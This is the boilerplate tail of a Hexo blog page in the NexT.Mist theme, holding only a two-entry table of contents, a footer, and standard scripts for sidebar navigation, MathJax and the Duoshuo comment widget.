          <div class="post-toc-indicator-top post-toc-indicator"></div>
          <div class="post-toc">
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#翻译"><span class="nav-number">1.</span> <span class="nav-text">翻译</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#原文"><span class="nav-number">2.</span> <span class="nav-text">原文</span></a></li></ol></div>
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
        </div>
      

    </div>
  </div>


    </div>

    <div id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; &nbsp;  2015 - 
  2017
  <span class="with-love">
    <i class="icon-heart"></i>
  </span>
  <span class="author">Ray</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>



      </div>
    </div>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>



  <script type="text/javascript" src="/js/search-toggle.js"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var $sidebarInner = $('.sidebar-inner');
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.didShow', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;
          var self = this;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      $(indicator).velocity('stop').velocity({
        opacity: action === 'show' ? 0.4 : 0
      }, { duration: 100 });
    }

  });
</script>


  <script type="text/javascript" id="sidebar.nav">
    $(document).ready(function () {
      var html = $('html');

      $('.sidebar-nav li').on('click', function () {
        var item = $(this);
        var activeTabClassName = 'sidebar-nav-active';
        var activePanelClassName = 'sidebar-panel-active';
        if (item.hasClass(activeTabClassName)) {
          return;
        }

        var currentTarget = $('.' + activePanelClassName);
        var target = $('.' + item.data('target'));

        currentTarget.velocity('transition.slideUpOut', 200, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', 200)
            .addClass(activePanelClassName);
        });

        item.siblings().removeClass(activeTabClassName);
        item.addClass(activeTabClassName);
      });

      $('.post-toc a').on('click', function (e) {
        e.preventDefault();
        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        });
      });

      // Expand sidebar on post detail page by default, when post has a toc.
      var $tocContent = $('.post-toc-content');
      if (isDesktop() && CONFIG.sidebar === 'post') {
        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
          displaySidebar();
        }
      }
    });
  </script>




  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
    });
  </script>

  
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
      processEscapes: true,
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
  });
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for (i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


  
  

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"blkstone"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>

  


  
  

</body>
</html>
